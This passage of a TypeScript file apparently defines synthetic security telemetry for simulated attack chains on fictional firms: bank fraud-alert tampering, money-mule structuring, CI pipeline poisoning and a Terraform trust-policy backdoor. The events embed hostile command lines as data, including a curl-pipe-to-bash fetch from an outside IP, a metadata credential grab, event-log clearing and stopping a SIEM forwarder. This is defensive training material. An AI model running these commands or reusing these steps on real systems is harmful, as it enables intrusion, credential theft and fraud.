    raw: { "pan.action": "deny", "pan.rule": "ALLOW-OUTBOUND-HTTPS", "threat.name": "Generic-Wire-Fraud-C2", "threat.severity": "critical", "threat.technique.id": "T1071.001", "destination.ip": "194.36.189.20", "destination.port": "443", "action_result": "blocked" }
  },
  {
    id: "qbwf11", ts: "2026-06-15T08:41:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "high", vendor: "AWS CloudTrail (GovCloud)", src_ip: "194.36.189.20",
    description: "An attempt to stop logging on the GovCloud CloudTrail trail from 194.36.189.20 was denied by an IAM permission boundary",
    mitre_technique: "T1685.002", mitre_tactic: "Defense Impairment",
    raw: { "aws.cloudtrail.eventName": "StopLogging", "aws.cloudtrail.eventSource": "cloudtrail.amazonaws.com", "aws.cloudtrail.errorCode": "AccessDenied", "aws.cloudtrail.errorMessage": "User is not authorized to perform: cloudtrail:StopLogging", "aws.cloudtrail.sourceIPAddress": "194.36.189.20", "action_result": "denied" }
  },
];

// ── QuantumBank Chain F — fraud-monitoring / alerting tampering ────────────────
const QB_FRAUD_MONITORING_TAMPERING: TelemetryEvent[] = [
  {
    id: "qbft1", ts: "2026-06-20T22:10:00.000Z", source: "okta", event_type: "auth_success",
    severity: "medium", vendor: "Okta", user_email: "l.brunner@quantumbank.ch", src_ip: "10.100.1.20",
    description: "l.brunner signed in to Okta at 22:10 from a device Okta had not seen before — well outside normal working hours",
    mitre_technique: "T1078", mitre_tactic: "Initial Access",
    raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.debugContext.debugData.riskLevel": "MEDIUM", "okta.debugContext.debugData.behaviors": "New Device=POSITIVE", "okta.authenticationContext.credentialType": "PASSWORD", "action_result": "allowed" }
  },
  {
    id: "qbft2", ts: "2026-06-20T22:16:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", user_email: "l.brunner@quantumbank.ch", src_ip: "10.100.1.20",
    description: "l.brunner checked out svc-fraud-monitor from the FraudOps vault outside the approved maintenance window, no ticket attached",
    mitre_technique: "T1078.002", mitre_tactic: "Privilege Escalation",
    raw: { "pam.vault.name": "FraudOps", "pam.account.name": "svc-fraud-monitor@siem01", "pam.checkout.status": "approved", "access.request.status": "not_required", "cyberark.ticket.required": "true", "cyberark.ticket.provided": "false", "cyberark.change_window": "outside_window", "event.action": "credential-checkout", "event.outcome": "success", "user.email": "l.brunner@quantumbank.ch", "action_result": "allowed" }
  },
  {
    id: "qbft3", ts: "2026-06-20T22:24:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.20",
    description: "Using svc-fraud-monitor's assumed role, alarm actions were disabled on the composite alarm qb-fraud-threshold-alerts",
    mitre_technique: "T1685", mitre_tactic: "Defense Impairment",
    raw: { "aws.cloudtrail.eventName": "DisableAlarmActions", "aws.cloudtrail.eventSource": "monitoring.amazonaws.com", "aws.cloudtrail.requestParameters.alarmNames": "qb-fraud-threshold-alerts", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "aws.cloudtrail.awsRegion": "us-gov-west-1", "aws.cloudtrail.sourceIPAddress": "10.100.1.20", "action_result": "allowed" }
  },
  {
    // The page: a Sentinel analytic on alarm actions disabled for a fraud-monitoring alarm outside a change window.
    id: "qbft3b", ts: "2026-06-20T22:24:40.000Z", source: "siem", event_type: "risk_score_change",
    severity: "high", vendor: "Microsoft Sentinel", is_detection: true,
    description: "Sentinel raised a High alert: alarm actions disabled on qb-fraud-threshold-alerts by the svc-fraud-monitor assumed role, with no open change request.",
    mitre_technique: "T1685", mitre_tactic: "Defense Impairment",
    raw: { "AlertName": "Alarm actions disabled on a fraud-monitoring alarm", "ProductName": "Azure Sentinel", "AlertSeverity": "High", "Status": "New",
      "Entities.Account.Name": "svc-fraud-monitor", "ExtendedProperties.Alarm": "qb-fraud-threshold-alerts", "ExtendedProperties.API": "DisableAlarmActions",
      "ExtendedProperties.Principal": "assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "ExtendedProperties.Open Change Requests": "0", "event.action": "alert" }
  },
  {
    id: "qbft4", ts: "2026-06-20T22:26:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.20",
    description: "The same session raised the qb-large-wire-alarm reporting threshold from CHF 10,000 to CHF 500,000",
    mitre_technique: "T1685", mitre_tactic: "Defense Impairment",
    raw: { "aws.cloudtrail.eventName": "PutMetricAlarm", "aws.cloudtrail.eventSource": "monitoring.amazonaws.com", "aws.cloudtrail.requestParameters.alarmName": "qb-large-wire-alarm", "aws.cloudtrail.requestParameters.threshold": "500000", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "aws.cloudtrail.sourceIPAddress": "10.100.1.20", "action_result": "allowed" }
  },
  {
    id: "qbft5", ts: "2026-06-20T22:31:00.000Z", source: "edr", event_type: "process_create",
    severity: "high", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-fraud-monitor@quantumbank.ch", src_ip: "10.100.1.10",
    description: "Running as svc-fraud-monitor on SRV-QB-ADMIN01, PowerShell stopped the local SIEM forwarder service",
    mitre_technique: "T1685", mitre_tactic: "Defense Impairment",
    process: { name: "powershell.exe", pid: 8802, parent_name: "cmd.exe", parent_pid: 8800, user: "svc-fraud-monitor", cmdline: "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"" },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentBaseFileName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
  },
  {
    id: "qbft6", ts: "2026-06-20T22:40:00.000Z", source: "proxy", event_type: "http_request",
    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
    description: "A CHF 480,000 wire cleared through the SWIFT transfer API without triggering an alert, thanks to the raised threshold",
    mitre_technique: "T1657", mitre_tactic: "Impact",
    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers", "url.query": "amount_chf=480000&beneficiary_iban=HR1210010051863000160", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
  },
  {
    id: "qbft7", ts: "2026-06-20T22:49:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "high", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.20",
    description: "Nine minutes after the transfer cleared, the qb-large-wire-alarm threshold was restored to its original CHF 10,000 value",
    mitre_technique: "T1070", mitre_tactic: "Stealth",
    raw: { "aws.cloudtrail.eventName": "PutMetricAlarm", "aws.cloudtrail.eventSource": "monitoring.amazonaws.com", "aws.cloudtrail.requestParameters.alarmName": "qb-large-wire-alarm", "aws.cloudtrail.requestParameters.threshold": "10000", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "aws.cloudtrail.sourceIPAddress": "10.100.1.20", "action_result": "allowed" }
  },
  {
    id: "qbft8", ts: "2026-06-20T22:51:00.000Z", source: "edr", event_type: "process_create",
    severity: "medium", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-fraud-monitor@quantumbank.ch", src_ip: "10.100.1.10",
    description: "The SIEM forwarder service was restarted on SRV-QB-ADMIN01 moments after the alarm threshold was restored",
    mitre_technique: "T1070", mitre_tactic: "Stealth",
    process: { name: "powershell.exe", pid: 8830, parent_name: "cmd.exe", parent_pid: 8800, user: "svc-fraud-monitor", cmdline: "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"" },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentBaseFileName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
  },
  {
    id: "qbft9", ts: "2026-06-20T22:58:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.10",
    description: "svc-fraud-monitor was checked back in, but the PSM session recording for the entire window is flagged incomplete",
    mitre_technique: "T1685", mitre_tactic: "Defense Impairment",
    raw: { "pam.vault.name": "FraudOps", "pam.account.name": "svc-fraud-monitor@siem01", "pam.checkout.status": "returned", "session.state": "recording_incomplete", "cyberark.session.recorded": "false", "event.action": "session-checkin", "event.outcome": "anomalous", "action_result": "allowed" }
  },
];

// ── QuantumBank Chain G — CyberArk PAM abuse → money-mule payout (structuring) ─
const QB_CYBERARK_MULE_PAYOUT: TelemetryEvent[] = [
  {
    id: "qbmp1", ts: "2026-06-25T13:00:00.000Z", source: "okta", event_type: "auth_success",
    severity: "medium", vendor: "Okta", user_email: "e.steiner@quantumbank.ch", src_ip: "89.44.168.201",
    description: "e.steiner's Okta sign-in from 89.44.168.201 was flagged MEDIUM risk; a step-up Okta Verify push was approved from the same new device 40 seconds later",
    mitre_technique: "T1078", mitre_tactic: "Initial Access",
    raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.debugContext.debugData.riskLevel": "MEDIUM", "okta.debugContext.debugData.behaviors": "New Device=POSITIVE, New IP=POSITIVE", "okta.client.ipAddress": "89.44.168.201", "action_result": "allowed" }
  },
  {
    id: "qbmp2", ts: "2026-06-25T13:07:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", user_email: "e.steiner@quantumbank.ch", src_ip: "10.100.1.44",
    description: "e.steiner's identity checked out svc-corebanking-admin from the CoreBankingAdmins vault outside the approved change window",
    mitre_technique: "T1078.002", mitre_tactic: "Privilege Escalation",
    raw: { "pam.vault.name": "CoreBankingAdmins", "pam.account.name": "svc-corebanking-admin@corebanking-db01", "pam.checkout.status": "approved", "access.request.status": "not_required", "cyberark.ticket.required": "true", "cyberark.ticket.provided": "false", "event.action": "credential-checkout", "event.outcome": "success", "user.email": "e.steiner@quantumbank.ch", "action_result": "allowed" }
  },
  {
    id: "qbmp3", ts: "2026-06-25T13:11:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", user_email: "e.steiner@quantumbank.ch", src_ip: "10.100.1.44",
    description: "The PSM session opened for svc-corebanking-admin shows session recording disabled before connecting to the core-banking admin console",
    mitre_technique: "T1685", mitre_tactic: "Defense Impairment",
    raw: { "pam.vault.name": "CoreBankingAdmins", "pam.account.name": "svc-corebanking-admin@corebanking-db01", "pam.session.type": "PSM-RDP", "session.state": "recording_disabled", "cyberark.session.recorded": "false", "event.action": "session-start", "event.outcome": "anomalous", "action_result": "allowed" }
  },
  {
    id: "qbmp4", ts: "2026-06-25T13:18:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.44",
    description: "An ExecuteStatement call via the RDS Data API inserted a new, pre-approved beneficiary directly into the core-banking database, bypassing maker-checker",
    mitre_technique: "T1565.001", mitre_tactic: "Impact",
    raw: { "aws.cloudtrail.eventName": "ExecuteStatement", "aws.cloudtrail.eventSource": "rds-data.amazonaws.com", "aws.cloudtrail.requestParameters.resourceArn": "arn:aws:rds:eu-central-2:552134008821:cluster:qb-corebanking-cluster", "aws.cloudtrail.requestParameters.sql": "INSERT INTO beneficiaries (iban, name, approved) VALUES ('RO49AAAA1B31007593840000','Silver Fern Trading Ltd',1)", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-corebanking-admin-role/svc-corebanking-admin", "aws.cloudtrail.sourceIPAddress": "10.100.1.44", "action_result": "allowed" }
  },
  {
    id: "qbmp5", ts: "2026-06-25T13:24:00.000Z", source: "proxy", event_type: "http_request",
    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
    description: "A CHF 9,850 wire — just under the CHF 10,000 reporting threshold — was sent to the newly-inserted beneficiary",
    mitre_technique: "T1657", mitre_tactic: "Impact",
    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers", "url.query": "amount_chf=9850&beneficiary_iban=RO49AAAA1B31007593840000", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
  },
  {
    id: "qbmp6", ts: "2026-06-25T13:36:00.000Z", source: "proxy", event_type: "http_request",
    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
    description: "11 further sub-threshold wires totalling CHF 108,000 were sent to the same beneficiary over the next 40 minutes — classic structuring",
    mitre_technique: "T1657", mitre_tactic: "Impact",
    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers/batch", "url.query": "count=11&total_amount_chf=108000&beneficiary_iban=RO49AAAA1B31007593840000", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
  },
  {
    id: "qbmp7", ts: "2026-06-25T14:20:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.44",
    description: "svc-corebanking-admin was checked back in; the vault confirms the PSM recording for the session is missing",
    mitre_technique: "T1070", mitre_tactic: "Stealth",
    raw: { "pam.vault.name": "CoreBankingAdmins", "pam.account.name": "svc-corebanking-admin@corebanking-db01", "pam.checkout.status": "returned", "session.state": "recording_missing", "cyberark.session.recorded": "false", "event.action": "session-checkin", "event.outcome": "anomalous", "action_result": "allowed" }
  },
  {
    id: "qbmp8", ts: "2026-06-25T14:26:00.000Z", source: "edr", event_type: "process_create",
    severity: "critical", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-corebanking-admin@quantumbank.ch", src_ip: "10.100.1.10",
    is_detection: true,
    description: "wevtutil.exe cl Security ran as svc-corebanking-admin on SRV-QB-ADMIN01; CrowdStrike terminated the process",
    mitre_technique: "T1685.005", mitre_tactic: "Defense Impairment",
    process: { name: "wevtutil.exe", pid: 7920, parent_name: "cmd.exe", parent_pid: 7900, user: "svc-corebanking-admin", cmdline: "wevtutil.exe cl Security" },
    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.Tactic": "Defense Impairment", "crowdstrike.SeverityName": "CRITICAL", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed" }
  },
  {
    id: "qbmp9", ts: "2026-06-25T14:31:00.000Z", source: "firewall", event_type: "net_connection",
    severity: "high", vendor: "Palo Alto Networks NGFW", src_ip: "10.100.1.10", dst_ip: "45.155.205.90", dst_port: 443,
    description: "An outbound connection from SRV-QB-ADMIN01 to a known money-laundering-network indicator was blocked",
    mitre_technique: "T1071.001", mitre_tactic: "Command and Control",
    raw: { "pan.action": "deny", "pan.rule": "ALLOW-OUTBOUND-HTTPS", "threat.name": "MoneyMule-Network-Infra", "threat.severity": "high", "threat.technique.id": "T1071.001", "destination.ip": "45.155.205.90", "destination.port": "443", "action_result": "blocked" }
  },
];

// ── RocketStack Chain E — CI/CD pipeline poisoning via self-hosted GitHub Actions runner ─
const RS_CICD_PIPELINE_POISONING: TelemetryEvent[] = [
  {
    id: "rscp1", ts: "2026-06-18T09:00:00.000Z", source: "vcs", event_type: "policy_modification",
    severity: "high", vendor: "GitHub", user_email: "j.lee@rocketstack.io",
    description: "A PR merged into rocketstack-io/api-gateway added a curl-pipe-to-bash step to .github/workflows/deploy.yml",
    mitre_technique: "T1195.002", mitre_tactic: "Initial Access",
    raw: { "github.audit.action": "pull_request.merge", "github.audit.actor": "j.lee", "github.audit.repo": "rocketstack-io/api-gateway", "github.audit.base_ref": "main", "github.audit.head_ref": "chore/ci-speedup", "github.audit.merge_commit_sha": "9e8de4aa8b6af0743605343e1fe09b95b24e05df", "github.workflow.path": ".github/workflows/deploy.yml", "github.workflow.diff_added_lines": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "event.action": "pull_request.merge", "event.outcome": "success", "user.name": "j.lee" }
  },
  {
    id: "rscp2", ts: "2026-06-18T09:04:00.000Z", source: "vcs", event_type: "privileged_operation",
    severity: "medium", vendor: "GitHub", hostname: "SRV-PROD-001",
    description: "GitHub Actions ran the poisoned deploy.yml workflow on the self-hosted runner SRV-PROD-001",
    mitre_technique: "T1195.002", mitre_tactic: "Execution",
    raw: { "github.actions.workflow_name": "deploy.yml", "github.actions.run_id": "18294031882", "github.actions.runner_name": "SRV-PROD-001", "github.actions.runner_type": "self-hosted", "github.actions.repository": "rocketstack-io/api-gateway", "github.actions.head_sha": "9e8de4aa8b6af0743605343e1fe09b95b24e05df", "github.actions.conclusion": "success", "event.action": "workflow_run.completed", "event.outcome": "success" }
  },
  {
    id: "rscp3", ts: "2026-06-18T09:04:30.000Z", source: "edr", event_type: "process_create",
    severity: "high", vendor: "CrowdStrike Falcon", hostname: "SRV-PROD-001", user_email: "ci-pipeline@rocketstack.io", src_ip: "172.16.10.50",
    description: "The workflow step executed a curl-pipe-to-bash one-liner on SRV-PROD-001 as the ci-pipeline user",
    mitre_technique: "T1059.004", mitre_tactic: "Execution",
    process: { name: "bash", pid: 41210, parent_name: "sh", parent_pid: 41200, user: "ci-pipeline", cmdline: "curl -sSL http://185.220.101.42/bootstrap.sh | bash" },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "crowdstrike.FileName": "bash", "crowdstrike.ParentBaseFileName": "sh", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
  },
  {
    id: "rscp4", ts: "2026-06-18T09:05:10.000Z", source: "edr", event_type: "process_create",
    severity: "high", vendor: "CrowdStrike Falcon", hostname: "SRV-PROD-001", user_email: "ci-pipeline@rocketstack.io", src_ip: "172.16.10.50",
    description: "bootstrap.sh queried the EC2 instance metadata service for the attached IAM role's temporary credentials",
    mitre_technique: "T1552.005", mitre_tactic: "Credential Access",
    process: { name: "curl", pid: 41230, parent_name: "bash", parent_pid: 41210, user: "ci-pipeline", cmdline: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role" },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role", "crowdstrike.FileName": "curl", "crowdstrike.ParentBaseFileName": "bash", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
  },
  {
    id: "rscp5", ts: "2026-06-18T09:07:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS GuardDuty", src_ip: "185.220.101.42",
    is_detection: true,
    description: "GuardDuty raised InstanceCredentialExfiltration.OutsideAWS: SRV-PROD-001's instance-role credentials were used from an external IP",
    mitre_technique: "T1552.005", mitre_tactic: "Credential Access",
    raw: { "aws.guardduty.type": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS", "aws.guardduty.severity": "8.0", "aws.guardduty.title": "EC2 instance credentials are being used from an external IP address.", "aws.guardduty.resource.accessKeyDetails.accessKeyId": "ASIAW4ZRX7CIDEXAMPLE", "aws.guardduty.resource.accessKeyDetails.principalId": "AROAW4ZRX7CIRUNNER:i-0abc123def456789", "aws.guardduty.resource.accessKeyDetails.userType": "AssumedRole", "aws.guardduty.resource.instanceDetails.instanceId": "i-0abc123def456789", "aws.guardduty.service.action.awsApiCallAction.api": "GetCallerIdentity", "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4": "185.220.101.42", "aws.cloudtrail.awsRegion": "us-east-1", "aws.cloudtrail.recipientAccountId": "247316892041", "action_result": "detected" }
  },
  {
    id: "rscp6", ts: "2026-06-18T09:09:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
    description: "The stolen instance-role credentials called GetCallerIdentity from 185.220.101.42, confirming they were valid off-host",
    mitre_technique: "T1078.004", mitre_tactic: "Stealth",
    raw: { "aws.cloudtrail.eventName": "GetCallerIdentity", "aws.cloudtrail.eventSource": "sts.amazonaws.com", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-ci-deploy-role/i-0abc123def456789", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
  },
  {
    id: "rscp7", ts: "2026-06-18T09:12:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
    description: "CreateAccessKey established a standing access key on the IAM user rocketstack-deploy-prod, outliving the temporary role session",
    mitre_technique: "T1098.001", mitre_tactic: "Persistence",
    raw: { "aws.cloudtrail.eventName": "CreateAccessKey", "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.requestParameters.userName": "rocketstack-deploy-prod", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-ci-deploy-role/i-0abc123def456789", "aws.cloudtrail.userIdentity.accessKeyId": "ASIAW4ZRX7CIDEXAMPLE", "aws.cloudtrail.responseElements.accessKey.accessKeyId": "AKIAW4ZRX7DEPEXAMPLE", "aws.cloudtrail.responseElements.accessKey.userName": "rocketstack-deploy-prod", "aws.cloudtrail.responseElements.accessKey.status": "Active", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
  },
  {
    id: "rscp8", ts: "2026-06-18T09:16:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "high", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
    description: "GetSecretValue retrieved the production database master password from Secrets Manager",
    mitre_technique: "T1555.006", mitre_tactic: "Credential Access",
    raw: { "aws.cloudtrail.eventName": "GetSecretValue", "aws.cloudtrail.eventSource": "secretsmanager.amazonaws.com", "aws.cloudtrail.requestParameters.secretId": "rocketstack/prod/db-master-password", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-ci-deploy-role/i-0abc123def456789", "aws.cloudtrail.userIdentity.accessKeyId": "ASIAW4ZRX7CIDEXAMPLE", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
  },
  {
    id: "rscp9", ts: "2026-06-18T09:21:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
    description: "GetObject read exports/customers_full.csv from rocketstack-prod-customer-data using the new standing access key",
    mitre_technique: "T1530", mitre_tactic: "Collection",
    raw: { "aws.cloudtrail.eventName": "GetObject", "aws.cloudtrail.eventSource": "s3.amazonaws.com", "aws.cloudtrail.requestParameters.bucketName": "rocketstack-prod-customer-data", "aws.cloudtrail.requestParameters.key": "exports/customers_full.csv", "aws.cloudtrail.userIdentity.type": "IAMUser", "aws.cloudtrail.userIdentity.userName": "rocketstack-deploy-prod", "aws.cloudtrail.sourceIPAddress": "185.220.101.42", "action_result": "allowed" }
  },
  {
    id: "rscp10", ts: "2026-06-18T09:26:00.000Z", source: "firewall", event_type: "net_connection",
    severity: "high", vendor: "FortiGate", src_ip: "172.16.10.50", dst_ip: "185.220.101.42", dst_port: 443,
    description: "A further outbound transfer from SRV-PROD-001 to 185.220.101.42 was blocked once threat intel flagged the IP",
    mitre_technique: "T1041", mitre_tactic: "Exfiltration",
    raw: { "data.type": "traffic", "data.subtype": "forward", "data.logid": "0000000021", "data.level": "warning", "data.action": "deny", "data.srcip": "172.16.10.50", "data.dstip": "185.220.101.42", "data.dstport": "443", "data.service": "HTTPS", "data.policyname": "prod-egress-filter", "data.srccountry": "Reserved", "action_result": "blocked" }
  },
  {
    id: "rscp11", ts: "2026-06-18T09:30:00.000Z", source: "edr", event_type: "process_create",
    severity: "critical", vendor: "CrowdStrike Falcon", hostname: "SRV-PROD-001", src_ip: "172.16.10.50",
    is_detection: true,
    description: "Falcon matched bootstrap.sh against an updated IOC feed, killed the lingering process and quarantined the file",
    mitre_technique: "T1195.002", mitre_tactic: "Persistence",
    process: { name: "bootstrap.sh", pid: 41210, parent_name: "sh", parent_pid: 41200, user: "ci-pipeline", path: "/tmp/bootstrap.sh" },
    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Supply Chain Compromise", "crowdstrike.Tactic": "Persistence", "crowdstrike.SeverityName": "CRITICAL", "crowdstrike.PatternDispositionDescription": "Process Terminated, File Quarantined", "quarantine.status": "quarantined", "action_result": "process_killed" }
  },
];

// ── RocketStack Chain F — IaC (Terraform) backdoor via poisoned trust policy ───
const RS_TERRAFORM_IAC_BACKDOOR: TelemetryEvent[] = [
  {
    id: "rstb1", ts: "2026-06-22T14:00:00.000Z", source: "vcs", event_type: "policy_modification",
    severity: "high", vendor: "GitHub", user_email: "m.ben-david@rocketstack.io",
    description: "A PR merged into rocketstack-io/terraform-aws-network added an external AWS account to the rocketstack-prod-admin role's trust policy",
    mitre_technique: "T1195.002", mitre_tactic: "Initial Access",
    raw: { "github.audit.action": "pull_request.merge", "github.audit.actor": "m.ben-david", "github.audit.repo": "rocketstack-io/terraform-aws-network", "github.audit.base_ref": "main", "github.audit.head_ref": "fix/network-module-refactor", "github.workflow.diff_added_lines": "Principal = { AWS = \"arn:aws:iam::999999999999:root\" }", "event.action": "pull_request.merge", "event.outcome": "success", "user.name": "m.ben-david" }
  },
  {
    id: "rstb2", ts: "2026-06-22T14:06:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "172.16.10.50",
    description: "The CI apply ran UpdateAssumeRolePolicy on rocketstack-prod-admin, adding sts:AssumeRole for an external account",
    mitre_technique: "T1098.003", mitre_tactic: "Persistence",
    raw: { "aws.cloudtrail.eventName": "UpdateAssumeRolePolicy", "aws.cloudtrail.eventSource": "iam.amazonaws.com", "aws.cloudtrail.requestParameters.roleName": "rocketstack-prod-admin", "aws.cloudtrail.requestParameters.policyDocument": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999999999999:root\"},\"Action\":\"sts:AssumeRole\"}]}", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::247316892041:assumed-role/rocketstack-ci-deploy-role/ci-pipeline", "aws.cloudtrail.sourceIPAddress": "172.16.10.50", "action_result": "allowed" }
  },
  {
    id: "rstb3", ts: "2026-06-22T14:08:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "high", vendor: "AWS GuardDuty", src_ip: "172.16.10.50",
    is_detection: true,
    description: "GuardDuty flagged ci-pipeline's trust-policy change as PrivilegeEscalation:IAMUser/AdministrativePermissions",
    mitre_technique: "T1098.003", mitre_tactic: "Persistence",
    raw: { "aws.guardduty.type": "PrivilegeEscalation:IAMUser/AnomalousBehavior", "aws.guardduty.severity": "7.0", "aws.guardduty.title": "An IAM entity invoked an API commonly used to change the permissions of users, groups or roles.", "aws.guardduty.resource.accessKeyDetails.userName": "ci-pipeline", "aws.guardduty.resource.accessKeyDetails.userType": "IAMUser", "aws.guardduty.service.action.awsApiCallAction.api": "UpdateAssumeRolePolicy", "aws.cloudtrail.recipientAccountId": "247316892041", "aws.cloudtrail.awsRegion": "us-east-1", "action_result": "detected" }
  },
  {
    id: "rstb4", ts: "2026-06-22T14:15:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "91.234.100.55",
    description: "AssumeRole from the newly-trusted external account 999999999999 succeeded against rocketstack-prod-admin",
    mitre_technique: "T1199", mitre_tactic: "Initial Access",
    raw: { "aws.cloudtrail.eventName": "AssumeRole", "aws.cloudtrail.eventSource": "sts.amazonaws.com", "aws.cloudtrail.requestParameters.roleArn": "arn:aws:iam::247316892041:role/rocketstack-prod-admin", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.accountId": "999999999999", "aws.cloudtrail.sourceIPAddress": "91.234.100.55", "action_result": "allowed" }
  },
  {
    id: "rstb5", ts: "2026-06-22T14:19:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
    severity: "critical", vendor: "AWS CloudTrail", src_ip: "91.234.100.55",
    description: "The external principal listed buckets and read objects from rocketstack-prod-customer-data",
    mitre_technique: "T1530", mitre_tactic: "Collection",
